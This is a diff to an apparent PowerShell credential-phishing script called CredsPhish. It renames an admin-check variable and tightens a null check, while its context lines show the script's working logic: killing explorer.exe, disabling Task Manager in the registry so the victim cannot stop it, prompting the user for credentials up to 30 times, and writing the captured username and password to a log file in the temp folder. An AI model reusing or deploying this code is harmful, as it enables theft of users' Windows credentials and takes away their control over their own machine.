@@ -27,8 +27,8 @@ $timestamp = $null
 taskkill /f /im explorer.exe
 $ComputerName = $env:COMPUTERNAME
 $CurrentDomain_Name = $env:USERDOMAIN
-$shellCredsAdmin = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
-If($shellCredsAdmin){## Block Remote-Host 'Task Manager' to prevent users from aborting this PS script execution. (Admin privileges Required)
+$SYSTEM_SHELL = (([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
+If($SYSTEM_SHELL){## Block Remote-Host 'Task Manager' to prevent users from aborting this PS script execution. (Admin privileges Required)
     Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 1 -Force
 }
 
@@ -71,7 +71,7 @@ function Credentials(){
         ## Defining the Limmit number of times to ask target for creds before aborting.
         # Change the next value to increase/decrease the number of times the msgbox prompts.
         If($counter -eq 30){
-            If($shellCredsAdmin){## This Line Un-Blocks Remote-Host 'Task Manager' after reached 30 credentials fail attempts. (Admin privileges Required)
+            If($SYSTEM_SHELL){## This Line Un-Blocks Remote-Host 'Task Manager' after reached 30 credentials fail attempts. (Admin privileges Required)
                 Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force
             }
           Start-Process -FilePath $env:windir\explorer.exe
@@ -85,7 +85,7 @@ function Credentials(){
             $counter++
             Credentials
         }
-        if (-not($creds.CredentialUserName)){
+        if (-not($creds.CredentialUserName) -or $creds.CredentialUserName -eq $null){
             $counter++
             Credentials
         }
@@ -103,7 +103,7 @@ function Credentials(){
                     echo "   TimeStamp : $timestamp" >> $env:tmp\CredsPhish.log
                     echo "   username  : $Username" >> $env:tmp\CredsPhish.log
                     echo "   password  : $Password" >> $env:tmp\CredsPhish.log
-                        If($shellCredsAdmin){## This Line Un-Blocks Remote-Host 'task manager' after an valid credential is found. (Admin privileges Required)
+                        If($SYSTEM_SHELL){## This Line Un-Blocks Remote-Host 'task manager' after an valid credential is found. (Admin privileges Required)
                             Set-Itemproperty -path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\policies\system' -Name 'DisableTaskMgr' -value 0 -Force
                         }
                     Start-Process -FilePath $env:windir\explorer.exe
